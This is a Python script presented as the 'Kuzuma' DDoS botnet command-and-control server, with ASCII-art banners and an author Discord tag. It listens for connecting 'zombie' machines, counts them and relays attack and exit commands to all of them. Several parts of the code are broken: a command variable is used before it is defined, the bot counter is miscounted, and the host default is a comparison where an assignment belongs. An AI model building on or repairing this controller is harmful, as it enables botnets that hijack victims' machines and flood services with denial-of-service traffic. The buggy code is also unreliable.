from selenium import webdriver
import time
import os,sys
os.system("cls")
#Colour
yellow='\033[93m'
gren='\033[92m'
cyan='\033[96m'
pink='\033[95m'
red='\033[91m'
b='\033[1m'
##############

os.system("clear")
print("""\033[93m
             __      ANONYMOUS       _____
            / /  __ _ _   _  ___ _  |___  |
           / /  / _` | | | |/ _ \ '__| / /
          / /__| (_| | |_| |  __/ |   / /
          \____/\__,_|\__, |\___|_|  /_/
                      |___/
                 ADDED NEW METHOD 
               DDoS Layer7 (DDoS) 💥
""")
print()
import sys
from sys import platform
import os
import socket
import subprocess
import time
from time import sleep
import colorama
from colorama import Style, Fore 
import threading as thread
import _thread


osystem = sys.platform

if osystem == "linux":
    os.system("clear")
else:
    os.system("cls")
 
 
welcome ="""
        Welcome to Kuzuma Network
------------------------------------------
"""
time.sleep(1.7)
if osystem == "linux":
    os.system("clear")

else:
    os.system("cls")

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("""
KuzumaNet
DDoS Botnet
Discord: zSodex#3828 :D""")

time.sleep(1.3)
os.system("clear")
print(Fore.RED+"""
 ██ ▄█▀ █    ██ ▒███████▒ █    ██  ███▄ ▄███▓ ▄▄▄      
 ██▄█▒  ██  ▓██▒▒ ▒ ▒ ▄▀░ ██  ▓██▒▓██▒▀█▀ ██▒▒████▄    
▓███▄░ ▓██  ▒██░░ ▒ ▄▀▒░ ▓██  ▒██░▓██    ▓██░▒██  ▀█▄  
▓██ █▄ ▓▓█  ░██░  ▄▀▒   ░▓▓█  ░██░▒██    ▒██ ░██▄▄▄▄██  
▒██▒ █▄▒▒█████▓ ▒███████▒▒▒█████ ▒██▒   ░██▒ ▓█   ▓██▒
▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ░▒▒ ▓░▒░▒░▒▓▒ ▒ ▒ ░ ▒░   ░  ░ ▒▒   ▓▒█░░ 
░ ░▒ ▒░░░▒░ ░ ░ ░░▒ ▒ ░ ▒░░▒░ ░ ░ ░  ░      ░  ▒   ▒▒ ░░ ░
░ ░░ ░  ░░░ ░ ░ ░ ░ ░ ░ ░ ░░░ ░ ░ ░      ░     ░   ▒      ░  
░  ░      ░       ░ ░       ░            ░         ░  ░         
                ░                                              
""")
time.sleep(3.3)
os.system("clear")
print(Fore.BLUE + "DDoS Botnet By zSodex :D ")
print()
listclientes = []



def zombies():
    
    bots = 0 
    for bots in listclientes:
        bots =+1
        print(f"[+] Bots: {bots}")




def clientes(client_addr):
     
    
    print(Fore.BLUE + f"[+] {client_addr[0]} | Just connected to Kuzuma")
    print()
    while True:

        if comm.startswith ("attack"):
            attack()
        if comm == "bots":
            zombies()

        if comm == " ":
            pass
        if comm == ".":
            pass

        if comm == "exit":
            for bots in listclientes:
                comm = comm.encode()
                bots.send(comm)
                salida()
             

            

 
        for bots in listclientes:
            comm = comm.encode()
            bots.send(comm)

        

def salida():
    print("[+] Bots in listening again, thanks for using Kuzuma :D  ")
    print("[*] Press CTRL-C to close the program!")
            
        


def attack():
    print(f"[+] Order sent to all zombies, be patient!")
def crtserver():
    global server
    from colorama import Style, Fore 
    lhost = input(Fore.RED + Style.BRIGHT + "[+] Enter server IP: => " )
    print()
    lport = int(input("[+] Enter server port: => "))
    #lport = 4444

    

    if lhost == "":
        lhost == 'localhost'
        pass

    try:

        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((lhost, lport))
        server.listen()
        print()
        print("[+] Waiting For Bots Handshake...")
    except KeyboardInterrupt:
        server.close()
         
        

     
    while True:
        try:
            clientt, client_addr = server.accept()
            _thread.start_new_thread(clientes, (client_addr,))
            listclientes.append(clientt)
            try:

                output = clientt.recv(1024)
                output = output.decode()
                print(f"""
                {output}""")
                 
            except:
                pass


        except KeyboardInterrupt:
            print()
            print("Byee!")
            server.close()
            break
 

crtserver()
